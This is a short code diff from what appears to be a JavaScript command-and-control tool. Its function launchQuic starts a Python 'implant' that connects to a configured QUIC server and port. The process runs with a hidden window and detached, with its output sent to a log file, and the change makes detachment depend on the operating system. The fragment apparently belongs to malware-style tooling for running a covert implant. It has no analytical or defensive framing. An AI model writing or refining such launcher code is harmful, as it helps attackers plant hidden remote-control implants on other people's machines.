@@ -1323,7 +1323,7 @@ async function launchQuic(implantPath) {
     const fd = fs.openSync(logf, 'a');
     const child = spawn(py, [implantPath, '--server', QUIC.server, '--port', QUIC.port], {
       windowsHide: true,
-      detached: true,
+      detached: !IS_WIN,
       stdio: ['ignore', fd, fd]
     });
     fs.closeSync(fd);
